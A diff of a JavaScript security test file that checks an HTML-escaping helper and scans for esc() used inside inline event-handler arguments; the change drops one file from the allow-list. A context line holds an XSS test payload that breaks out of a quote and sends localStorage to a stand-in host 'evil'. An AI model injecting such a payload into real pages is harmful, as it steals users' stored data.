@@ -18,10 +18,10 @@ const esc = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), '
 const payload = "x');fetch('//evil/?'+btoa(JSON.stringify(localStorage)));//";
 t('the review\'s payload stays inside a data-cat attribute (no raw quote survives esc)', !/['"<>]/.test(esc(payload).replace(/&#39;|&quot;|&lt;|&gt;|&amp;/g, '')));
 /* reviews5 (GF-03 M8 · GF-05 M10 · EL-04 M14): esc() INSIDE a quoted JS argument of an inline handler. The browser decodes &#39; to ' before the
-   JS runs, so a value with a quote ends the string and the rest runs. The argument goes through escJs (helpers.js). Allowed leftovers: the till
-   copy (vendored, the api master owns it), app.html and lab/ (named below; this list only shrinks). */
+   JS runs, so a value with a quote ends the string and the rest runs. The argument goes through escJs (helpers.js). Allowed leftovers: app.html and lab/
+   (named below; this list only shrinks). The till copy left the list in batch 1129: its master (api tools/tally-connector/till.html) uses escJs. */
 const inHandlerArg = /[(,]\s*(?:\\'['"]|'")\s*\+\s*esc\(/g;
-const allowLeft = /^(till\.html|app\.html|lab[\\/]combo-mode\.js)$/;
+const allowLeft = /^(app\.html|lab[\\/]combo-mode\.js)$/;
 const leaks = walk(root).filter((f) => /\.(html|js)$/.test(f) && !allowLeft.test(path.relative(root, f)))
   .flatMap((f) => { const src = fs.readFileSync(f, 'utf8'); const out = []; let m; while ((m = inHandlerArg.exec(src))) out.push(path.relative(root, f) + ':' + (src.slice(0, m.index).split('\n').length)); return out; });
 t('no esc( inside a quoted JS argument of an inline handler (use escJs)', leaks.length === 0, leaks.slice(0, 8).join(', ') + (leaks.length > 8 ? ' … ' + leaks.length : ''));
